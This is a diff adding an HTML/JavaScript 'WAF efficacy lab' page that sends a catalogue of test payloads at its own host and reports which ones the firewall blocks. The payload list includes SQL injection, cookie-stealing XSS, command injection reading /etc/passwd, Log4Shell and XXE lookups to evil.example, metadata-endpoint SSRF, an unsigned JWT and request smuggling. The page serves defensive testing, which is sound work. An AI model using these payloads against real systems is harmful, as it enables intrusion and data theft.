@@ -1,0 +1,262 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>WSLProxy WAF Efficacy Lab</title>
+<style>
+  :root{
+    --bg:#0b1020;--panel:#111827;--panel2:#0f1626;--line:#1f2937;--ink:#e5e7eb;
+    --muted:#9aa4b8;--faint:#6b7280;--accent:#6366f1;--accent2:#818cf8;
+    --safe:#34d399;--safe-soft:#0f2a22;--danger:#f87171;--danger-soft:#2a1518;
+    --warn:#fbbf24;--warn-soft:#2a2312;--mono:ui-monospace,SFMono-Regular,Menlo,monospace;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:radial-gradient(1200px 600px at 80% -10%,#141d33,transparent),var(--bg);
+    color:var(--ink);font:15px/1.5 system-ui,-apple-system,"Segoe UI",sans-serif}
+  a{color:var(--accent2);text-decoration:none}a:hover{text-decoration:underline}
+  code{font-family:var(--mono);font-size:.85em;background:#0c1424;border:1px solid var(--line);
+    padding:.05rem .32rem;border-radius:5px;color:#c7d2fe}
+  .wrap{max-width:1180px;margin:0 auto;padding:1.8rem 1.2rem 4rem}
+  .eyebrow{display:inline-flex;align-items:center;gap:.5rem;font:600 .72rem/1 var(--mono);
+    letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+  .eyebrow .dot{width:8px;height:8px;border-radius:50%;background:var(--accent);
+    box-shadow:0 0 0 4px color-mix(in srgb,var(--accent) 22%,transparent)}
+  h1{font-size:1.7rem;margin:.4rem 0 .2rem;letter-spacing:-.02em}
+  .host{font-family:var(--mono);color:var(--accent2)}
+  .verdict{margin:1rem 0;padding:1rem 1.2rem;border-radius:14px;border:1px solid var(--line);
+    background:var(--panel);display:flex;gap:1rem;align-items:center;flex-wrap:wrap}
+  .verdict .big{font-size:1.6rem;font-weight:700}
+  .verdict.secure{border-color:#1c4034;background:linear-gradient(180deg,#0f2a22,#0d1a18)}
+  .verdict.open{border-color:#3a1d20;background:linear-gradient(180deg,#2a1518,#1a1012)}
+  .verdict .tag{font:700 .72rem/1 var(--mono);padding:.35rem .6rem;border-radius:999px;text-transform:uppercase;letter-spacing:.04em}
+  .verdict.secure .tag{color:#052e2b;background:var(--safe)}
+  .verdict.open .tag{color:#fff;background:var(--danger)}
+  .bar{display:flex;gap:.5rem;flex-wrap:wrap;align-items:center;margin:1rem 0}
+  button{font:600 .9rem/1 system-ui;color:#fff;background:var(--accent);border:0;border-radius:10px;
+    padding:.6rem .95rem;cursor:pointer}
+  button.ghost{background:var(--panel);color:var(--ink);border:1px solid var(--line)}
+  button:disabled{opacity:.5;cursor:not-allowed}
+  .search{flex:1;min-width:180px;background:var(--panel2);border:1px solid var(--line);border-radius:10px;
+    color:var(--ink);padding:.55rem .8rem}
+  .chips{display:flex;flex-wrap:wrap;gap:.35rem;margin:.4rem 0 .8rem}
+  .chip{font:600 .72rem/1 var(--mono);color:var(--muted);background:var(--panel);border:1px solid var(--line);
+    border-radius:999px;padding:.32rem .6rem;cursor:pointer;text-transform:uppercase;letter-spacing:.03em}
+  .chip.on{color:#fff;background:var(--accent);border-color:var(--accent)}
+  .counts{display:flex;gap:.5rem;flex-wrap:wrap;margin:.2rem 0 .8rem}
+  .pill{font:600 .78rem/1 var(--mono);border:1px solid var(--line);border-radius:999px;padding:.35rem .6rem;color:var(--muted)}
+  .pill b{color:var(--ink)}
+  table{width:100%;border-collapse:collapse;font-size:.88rem}
+  th,td{text-align:left;padding:.55rem .6rem;border-bottom:1px solid var(--line);vertical-align:top}
+  th{color:var(--faint);font:600 .72rem/1 var(--mono);text-transform:uppercase;letter-spacing:.04em;position:sticky;top:0;background:var(--bg)}
+  tr:hover td{background:#0c1526}
+  .m{font-family:var(--mono);font-size:.82rem}
+  .b{display:inline-block;font:700 .68rem/1 var(--mono);padding:.28rem .45rem;border-radius:6px;text-transform:uppercase;letter-spacing:.03em}
+  .b.block{color:#fff;background:#b91c1c}.b.pass-open{color:#052e2b;background:var(--safe)}
+  .b.wait{color:var(--muted);background:#0c1424;border:1px solid var(--line)}
+  .b.skip{color:#111;background:var(--warn)}
+  .b.err{color:#fff;background:#7c2d12}
+  .v-pass{color:var(--safe);font-weight:700}.v-fail{color:var(--danger);font-weight:700}
+  .rule{font-family:var(--mono);font-size:.8rem;color:#c7d2fe}
+  .sid{font-family:var(--mono);font-size:.72rem;color:var(--faint)}
+  .expand{cursor:pointer;color:var(--accent2)}
+  .payload{background:#0a1120;border:1px solid var(--line);border-radius:8px;padding:.6rem .7rem;margin:.4rem 0 0;
+    font-family:var(--mono);font-size:.78rem;color:#d7def0;white-space:pre-wrap;word-break:break-word}
+  .grp{color:var(--faint);font-size:.72rem}
+  .foot{color:var(--faint);font-size:.85rem;margin-top:1.6rem;border-top:1px solid var(--line);padding-top:1rem}
+  .switch{margin-left:auto}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <span class="eyebrow"><span class="dot"></span> WSLProxy WAF · efficacy lab</span>
+  <h1>WAF Efficacy Lab — <span class="host" id="host"></span></h1>
+  <p style="color:var(--muted);margin:.2rem 0 0">Fire every shipped WAF test case (GET
+  <b>and</b> POST) at <b>this host</b> and see, live, what the WAF stops — matched rule,
+  violation code and support id. The lab tests the host that serves it (same-origin is the
+  only way a browser can read a WAF block); use the switch to flip between the protected and
+  unprotected host.</p>
+
+  <div class="verdict" id="verdict"><span class="big" id="vbig">—</span>
+    <span id="vtext" style="color:var(--muted)">Click <b>Run all</b> to test this host.</span>
+    <a class="switch ghost" id="switch" style="display:none"></a>
+  </div>
+
+  <div class="bar">
+    <button id="runall">▶ Run all</button>
+    <button class="ghost" id="reset">Reset</button>
+    <input class="search" id="q" placeholder="Filter — sqli, jwt, smuggling, /api/…">
+    <a class="ghost" id="switch2" href="#" style="padding:.6rem .95rem;border-radius:10px;display:none"></a>
+  </div>
+  <div class="chips" id="chips"></div>
+  <div class="counts" id="counts"></div>
+
+  <table>
+    <thead><tr>
+      <th style="width:30%">Attack</th><th>Method</th><th>Expect</th>
+      <th>Status</th><th>Result</th><th>Rule / violation</th><th>Verdict</th><th></th>
+    </tr></thead>
+    <tbody id="rows"></tbody>
+  </table>
+
+  <p class="foot">Same-origin only: a browser can read a WAF <code>403</code> block and the
+  <code>x-waf-*</code> headers just for the host serving this page. One case
+  (scanner User-Agent) can't run in-browser because scripts may not set
+  <code>User-Agent</code> — run it with <code>curl</code>. For the machine-readable matrix
+  and the open-host control, use <code>test_waf_live.py</code>. Generated by
+  <code>gen_waf_lab.py</code> from <code>test_waf_live.py</code>.</p>
+</div>
+
+<script>
+  const ATTACKS = [{"name": "sqli-union", "group": "SQL injection", "method": "GET", "path": "/products?cat=x' UNION SELECT * FROM users--", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-sqli-001"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "sqli-select-from", "group": "SQL injection", "method": "GET", "path": "/products?cat=select id from users", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-sqli-002"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "sqli-insert", "group": "SQL injection", "method": "GET", "path": "/products?cat=x'; INSERT INTO users VALUES(1)--", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-sqli-003"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "sqli-drop", "group": "SQL injection", "method": "GET", "path": "/products?cat=x'; DROP TABLE users--", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-sqli-004"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "sqli-boolean", "group": "SQL injection", "method": "GET", "path": "/products?cat=1 OR 1=1", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-sqli-005"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "sqli-comment-monitor", "group": "SQL injection", "method": "GET", "path": "/products?cat=1-- ", "expect": "monitor", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-sqli-006"], "notes": "seed rule action=monitor — must not hard-block alone", "browser": true, "forbidden_reason": ""}, {"name": "sqli-time", "group": "SQL injection", "method": "GET", "path": "/products?cat=1; SELECT SLEEP(1)", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-sqli-007"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "xss-script", "group": "XSS", "method": "GET", "path": "/search?q=\u003cscript\u003ealert(document.cookie)\u003c/script\u003e", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-xss-001"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "xss-javascript-uri", "group": "XSS", "method": "GET", "path": "/search?q=javascript:alert(1)", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-xss-002"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "xss-event-handler", "group": "XSS", "method": "GET", "path": "/search?q=\u003cimg src=x onerror=alert(1)\u003e", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-xss-003"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "xss-html-tag-src", "group": "XSS", "method": "GET", "path": "/search?q=\u003cimg src=http://evil.example/x\u003e", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-xss-004"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "xss-dom-eval", "group": "XSS", "method": "GET", "path": "/search?q=eval(document.cookie)", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-xss-005"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "cmdi-semicolon", "group": "Command injection", "method": "GET", "path": "/ping?host=127.0.0.1;id", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-cmdi-001"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "cmdi-pipe", "group": "Command injection", "method": "GET", "path": "/ping?host=127.0.0.1|cat /etc/passwd", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-cmdi-002"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "cmdi-backtick", "group": "Command injection", "method": "GET", "path": "/ping?host=`id`", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-cmdi-003"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "cmdi-subshell", "group": "Command injection", "method": "GET", "path": "/ping?host=$(whoami)", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-cmdi-004"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "lfi-dotdot", "group": "LFI / traversal", "method": "GET", "path": "/statement?file=../../../../../../etc/passwd", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-lfi-001", "waf-rule-lfi-002", "waf-rule-lfi-003"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "lfi-passwd", "group": "LFI / traversal", "method": "GET", "path": "/statement?file=/etc/passwd", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-lfi-002"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "lfi-encoded", "group": "LFI / traversal", "method": "GET", "path": "/statement?file=..%2f..%2f..%2fetc/passwd", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-lfi-003", "waf-rule-lfi-001", "waf-rule-lfi-002"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "proto-null-byte", "group": "Protocol", "method": "GET", "path": "/products?cat=foo%00", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-proto-001"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "proto-crlf", "group": "Protocol", "method": "GET", "path": "/products?cat=x%0d%0aX-Injected:1", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-proto-002"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "ssti-arithmetic", "group": "SSTI", "method": "GET", "path": "/render?tpl={{7*7}}", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-ssti-001"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "ssti-config", "group": "SSTI", "method": "GET", "path": "/render?tpl={{config}}", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-ssti-001"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "log4shell-jndi", "group": "RCE (CVE)", "method": "GET", "path": "/lookup?user=${jndi:ldap://evil.example/a}", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-log4shell-001"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "log4shell-obfuscated", "group": "RCE (CVE)", "method": "GET", "path": "/lookup?user=${${lower:j}ndi:ldap://evil.example/a}", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-log4shell-002"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "spring4shell", "group": "RCE (CVE)", "method": "GET", "path": "/bind?class.module.classLoader.URLs%5B0%5D=x", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-spring4shell-001"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "ssrf-metadata", "group": "SSRF", "method": "GET", "path": "/fetch?url=http://169.254.169.254/latest/meta-data/", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-ssrf-001"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "ssrf-gopher", "group": "SSRF", "method": "GET", "path": "/fetch?url=gopher://127.0.0.1:70/1", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-ssrf-002"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "nosqli", "group": "SQL injection", "method": "POST", "path": "/api/login", "expect": "block", "body": "{\"user\":\"admin\",\"pass\":{\"$ne\":null}}", "content_type": "application/json", "headers": {}, "expected": ["waf-rule-nosqli-001"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "xxe", "group": "XXE", "method": "POST", "path": "/api/import", "expect": "block", "body": "\u003c?xml version=\"1.0\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY xxe SYSTEM \"http://evil.example/x\"\u003e]\u003e\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e", "content_type": "application/xml", "headers": {}, "expected": ["waf-rule-xxe-001"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "jwt-alg-none", "group": "Stage / positive-security", "method": "GET", "path": "/api/me", "expect": "block", "body": null, "content_type": null, "headers": {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."}, "expected": ["VIOL_JWT_ALG", "waf-rule-jwt-none-001"], "notes": "v2 jwt.denyAlg usually wins before the signature rule", "browser": true, "forbidden_reason": ""}, {"name": "proto-pollution", "group": "Prototype pollution", "method": "POST", "path": "/api/merge", "expect": "block", "body": "{\"__proto__\":{\"admin\":true}}", "content_type": "application/json", "headers": {}, "expected": ["waf-rule-protopollute-001"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "graphql-introspection", "group": "GraphQL", "method": "POST", "path": "/graphql", "expect": "block", "body": "{\"query\":\"query IntrospectionQuery {__schema {types {name}}}\"}", "content_type": "application/json", "headers": {}, "expected": ["waf-rule-graphql-introspection-001"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "scanner-ua", "group": "Scanner / bot", "method": "GET", "path": "/products?cat=deposit", "expect": "block", "body": null, "content_type": null, "headers": {"User-Agent": "sqlmap/1.7.11#stable (https://sqlmap.org)"}, "expected": ["waf-rule-scanner-ua-001"], "notes": "", "browser": false, "forbidden_reason": "browser can't set the User-Agent header — run this one with curl"}, {"name": "cmdi-json-chain", "group": "Command injection", "method": "POST", "path": "/api/login", "expect": "block", "body": "{\"user\":\"a\",\"pass\":\"x; id\"}", "content_type": "application/json", "headers": {}, "expected": ["waf-rule-cmdi-json-001"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "mass-assignment", "group": "Mass assignment", "method": "POST", "path": "/api/profile", "expect": "block", "body": "{\"user\":\"me\",\"role\":\"admin\"}", "content_type": "application/json", "headers": {}, "expected": ["waf-rule-massassign-001"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "http-request-smuggling", "group": "HTTP request smuggling", "method": "POST", "path": "/api/batch", "expect": "block", "body": "{\"batch\":\"noop\"}\r\n0\r\n\r\nGET /api/accounts/9999 HTTP/1.1\r\nHost: x\r\n\r\n", "content_type": "text/plain", "headers": {}, "expected": ["waf-rule-smuggling-001"], "notes": "smuggled request line embedded in the body (CWE-444)", "browser": true, "forbidden_reason": ""}, {"name": "open-redirect-staged", "group": "Open redirect", "method": "GET", "path": "/products?redirect=https://evil.example/phish", "expect": "allow", "body": null, "content_type": null, "headers": {}, "expected": ["waf-rule-openredirect-001"], "notes": "signature staged in policy until 2026-12-31 — must not hard-block", "browser": true, "forbidden_reason": ""}, {"name": "v2-filetype", "group": "Stage / positive-security", "method": "GET", "path": "/config.env", "expect": "block", "body": null, "content_type": null, "headers": {}, "expected": ["VIOL_FILETYPE"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "v2-method", "group": "Stage / positive-security", "method": "PUT", "path": "/api/profile", "expect": "block", "body": "{\"user\":\"me\"}", "content_type": "application/json", "headers": {}, "expected": ["VIOL_METHOD"], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "benign-products", "group": "Control / benign", "method": "GET", "path": "/products?cat=deposit", "expect": "allow", "body": null, "content_type": null, "headers": {}, "expected": [], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "benign-home", "group": "Control / benign", "method": "GET", "path": "/", "expect": "allow", "body": null, "content_type": null, "headers": {}, "expected": [], "notes": "", "browser": true, "forbidden_reason": ""}, {"name": "bola-idor-business-logic", "group": "Control / benign", "method": "GET", "path": "/api/accounts/9999", "expect": "allow", "body": null, "content_type": null, "headers": {}, "expected": [], "notes": "signature WAF cannot stop object-level authz flaws", "browser": true, "forbidden_reason": ""}];
+  const esc = s => String(s==null?"":s).replace(/[&<>]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;"}[c]));
+  const ORIGIN = location.origin;
+  let cat = "all", query = "", results = {};
+
+  // Show which host we're on and wire the switcher to its counterpart.
+  const h = location.hostname;
+  document.getElementById("host").textContent = h;
+  const other = h.includes("secure") ? h.replace("secure","open")
+              : h.includes("open") ? h.replace("open","secure")
+              : (h.startsWith("payments.") ? h.replace("payments.","payments-secure.") : null);
+  if(other){
+    const url = location.protocol+"//"+other+"/lab";
+    const a=document.getElementById("switch2"); a.href=url; a.textContent="↹ test "+other; a.style.display="";
+  }
+
+  // Build a valid same-origin URL while letting the WAF's decoded args still see the payload.
+  function buildUrl(path){
+    if(!path.includes("?")) return ORIGIN+encodeURI(path);
+    const i=path.indexOf("?");
+    return ORIGIN+encodeURI(path.slice(0,i))+"?"+encodeURI(path.slice(i+1)).replace(/#/g,"%23");
+  }
+
+  async function fire(a){
+    if(!a.browser) return {skip:true};
+    const opts={method:a.method,headers:{},redirect:"manual",cache:"no-store"};
+    if(a.body!=null){ opts.body=a.body; opts.headers["Content-Type"]=a.content_type||"application/json"; }
+    for(const k in a.headers){ if(k.toLowerCase()!=="user-agent") opts.headers[k]=a.headers[k]; }
+    try{
+      const r=await fetch(buildUrl(a.path),opts);
+      if(r.type==="opaqueredirect") return {status:"302", redirect:true, blocked:false};
+      const block=(r.headers.get("x-waf-block")||"").toLowerCase()==="true";
+      return {status:String(r.status),
+              blocked:(r.status===403&&block),
+              rule:r.headers.get("x-waf-rule")||"",
+              viol:r.headers.get("x-waf-violation")||"",
+              sid:r.headers.get("x-support-id")||""};
+    }catch(e){ return {status:"0", error:String(e)}; }
+  }
+
+  function verdict(a,res){
+    if(res.skip) return {ok:null,label:"skipped"};
+    if(res.error) return {ok:false,label:"error"};
+    if(a.expect==="block") return {ok:res.blocked,label:res.blocked?"blocked ✓":"NOT blocked ✗"};
+    // allow / monitor → should NOT hard-block
+    return {ok:!res.blocked,label:res.blocked?"blocked ✗":"passed ✓"};
+  }
+
+  const cats=["all",...[...new Set(ATTACKS.map(a=>a.group))].sort()];
+  const chips=document.getElementById("chips");
+  chips.innerHTML=cats.map(c=>`<span class="chip${c==="all"?" on":""}" data-c="${esc(c)}">${c==="all"?"all":esc(c)}</span>`).join("");
+  chips.onclick=e=>{const c=e.target.closest(".chip");if(!c)return;cat=c.dataset.c;
+    [...chips.children].forEach(x=>x.classList.toggle("on",x.dataset.c===cat));draw();};
+  document.getElementById("q").oninput=e=>{query=e.target.value.toLowerCase().trim();draw();};
+
+  function shown(){return ATTACKS.filter(a=>{
+    if(cat!=="all"&&a.group!==cat)return false;
+    if(!query)return true;
+    return (a.name+" "+a.group+" "+a.path+" "+a.expected.join(" ")).toLowerCase().includes(query);
+  });}
+
+  function idOf(a){return a.name;}
+
+  function rowHtml(a){
+    const res=results[idOf(a)];
+    let status='<span class="b wait">—</span>', result="", rulec="", verd="", act="";
+    if(res){
+      const v=verdict(a,res);
+      if(res.skip){ status='<span class="b skip">skip</span>'; result='<span class="grp">'+esc(a.forbidden_reason)+'</span>'; }
+      else if(res.error){ status='<span class="b err">net</span>'; result='<span class="grp">'+esc(res.error)+'</span>'; }
+      else{
+        status='<span class="m">'+esc(res.status)+'</span>';
+        result = res.blocked?'<span class="b block">BLOCKED</span>'
+               : (a.expect==="block"?'<span class="b pass-open">reached origin</span>':'<span class="b pass-open">passed</span>');
+        rulec = (res.rule?'<span class="rule">'+esc(res.rule)+'</span>':'')
+              + (res.viol&&res.viol!==res.rule?'<br><span class="sid">'+esc(res.viol)+'</span>':'')
+              + (res.sid?'<br><span class="sid">'+esc(res.sid)+'</span>':'');
+      }
+      if(v.ok!==null) verd='<span class="'+(v.ok?"v-pass":"v-fail")+'">'+v.label+'</span>';
+    }
+    act='<button class="ghost" data-fire="'+esc(a.name)+'" style="padding:.35rem .6rem;font-size:.78rem">fire</button>';
+    return `<tr>
+      <td><div>${esc(a.name)}</div><div class="grp">${esc(a.group)}</div>
+        <div class="expand" data-x="${esc(a.name)}">show payload ▾</div>
+        <div class="payload" id="p-${esc(a.name).replace(/[^a-z0-9]/gi,'_')}" style="display:none">${esc(a.method)} ${esc(a.path)}${a.body?("\n\n"+esc(a.body)):""}${Object.keys(a.headers).length?("\n\nheaders: "+esc(JSON.stringify(a.headers))):""}</div>
+      </td>
+      <td class="m">${esc(a.method)}</td>
+      <td class="m">${esc(a.expect)}</td>
+      <td>${status}</td>
+      <td>${result}</td>
+      <td>${rulec}</td>
+      <td>${verd}</td>
+      <td>${act}</td>
+    </tr>`;
+  }
+
+  function draw(){
+    const list=shown();
+    document.getElementById("rows").innerHTML=list.map(rowHtml).join("");
+    // counts + verdict banner
+    const done=list.map(a=>results[idOf(a)]).filter(Boolean);
+    const blocked=done.filter(r=>r&&r.blocked).length;
+    const ran=done.filter(r=>r&&!r.skip).length;
+    const attacksExpectingBlock=list.filter(a=>a.expect==="block"&&a.browser).length;
+    const passes=list.filter(a=>{const r=results[idOf(a)];if(!r||r.skip)return false;return verdict(a,r).ok;}).length;
+    document.getElementById("counts").innerHTML=
+      `<span class="pill">shown <b>${list.length}</b></span>`+
+      `<span class="pill">ran <b>${ran}</b></span>`+
+      `<span class="pill">blocked <b>${blocked}</b></span>`+
+      `<span class="pill">as-expected <b>${passes}/${ran}</b></span>`;
+    // Infer protection from results across ALL attacks (not just filtered).
+    const all=ATTACKS.map(a=>results[idOf(a)]).filter(r=>r&&!r.skip&&!r.error);
+    const allBlock=all.filter(r=>r.blocked).length;
+    const v=document.getElementById("verdict"), vb=document.getElementById("vbig"), vt=document.getElementById("vtext");
+    if(all.length>=3){
+      if(allBlock>=Math.max(1,Math.floor(all.length*0.5))){
+        v.className="verdict secure"; vb.textContent=allBlock+"/"+all.length+" blocked";
+        vt.innerHTML='<span class="tag">WAF active</span> This host is <b>protected</b> — attacks are stopped at the edge with <code>403</code> + <code>X-WAF-Block</code>.';
+      }else{
+        v.className="verdict open"; vb.textContent=allBlock+"/"+all.length+" blocked";
+        vt.innerHTML='<span class="tag">exposed</span> This host is <b>unprotected</b> — the payloads reach the origin. Switch to the secure host to see them blocked.';
+      }
+    }
+  }
+
+  document.getElementById("rows").addEventListener("click",e=>{
+    const x=e.target.closest("[data-x]");
+    if(x){const el=document.getElementById("p-"+x.dataset.x.replace(/[^a-z0-9]/gi,"_"));
+      el.style.display=el.style.display==="none"?"block":"none";return;}
+    const f=e.target.closest("[data-fire]");
+    if(f){const a=ATTACKS.find(z=>z.name===f.dataset.fire);runOne(a);}
+  });
+
+  async function runOne(a){ results[idOf(a)]=await fire(a); draw(); }
+
+  document.getElementById("runall").onclick=async()=>{
+    const btn=document.getElementById("runall"); btn.disabled=true; btn.textContent="running…";
+    // small concurrency so one host isn't hammered
+    const list=ATTACKS.slice(); let i=0;
+    async function worker(){ while(i<list.length){ const a=list[i++]; results[idOf(a)]=await fire(a); draw(); } }
+    await Promise.all([worker(),worker(),worker()]);
+    btn.disabled=false; btn.textContent="▶ Run all";
+  };
+  document.getElementById("reset").onclick=()=>{results={};draw();
+    const v=document.getElementById("verdict");v.className="verdict";
+    document.getElementById("vbig").textContent="—";
+    document.getElementById("vtext").innerHTML="Click <b>Run all</b> to test this host.";};
+
+  draw();
+</script>
+</body>
+</html>
